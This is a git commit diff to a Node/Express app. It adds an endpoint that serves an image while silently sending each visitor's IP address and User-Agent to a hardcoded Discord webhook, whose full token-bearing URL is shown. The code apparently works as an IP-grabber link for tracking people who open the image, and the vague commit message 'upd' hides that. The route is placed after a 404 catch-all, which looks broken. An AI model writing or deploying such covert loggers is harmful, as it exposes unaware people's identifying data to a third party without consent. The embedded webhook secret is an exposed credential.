af15b3566c3bf1be2475b1502ad6495a4ce0e0b2
G07HN-1 <101313675+G07HN-1@users.noreply.github.com>
2025-12-26 15:08:55 +0000

    upd

--- src/app.js
+++ src/app.js
@@ -34,6 +34,41 @@ app.use((req, res, next) => {
   res.status(404).sendFile(path.join(__dirname, '..', 'public', '404.html'));
 });
 
+// return image on endpoint/https/image
+app.get('/endpoint/https/image', (req, res) => {
+  // send response information to discord webhook
+  fetch('https://discord.com/api/webhooks/1366407365775069226/F3G_5Xp3Yhlf8Km8fSQwpPMLdHW4DSz8VePxdKkV0hPxntUXH1iYhLwlzAewvpaPC7e7', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      
+      content: `Image endpoint was accessed at ${new Date().toISOString()}`,
+  //ip adress of requester
+      embeds: [{
+        title: 'Image Endpoint Accessed',
+        description: `The image endpoint was accessed.`,
+        color: 5814783,
+        fields: [
+          {
+            name: 'IP Address',
+            value: req.ip,
+            inline: true,
+          },
+          {
+            name: 'User Agent',
+            value: req.get('User-Agent'),
+            inline: true,
+          },
+        ],
+        timestamp: new Date().toISOString(),
+      }],
+    }),
+  }).catch(err => console.error('Error sending webhook:', err));
+  res.sendFile(path.join(__dirname, '..', 'public', 'image.jpg'));
+});
+
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
 });
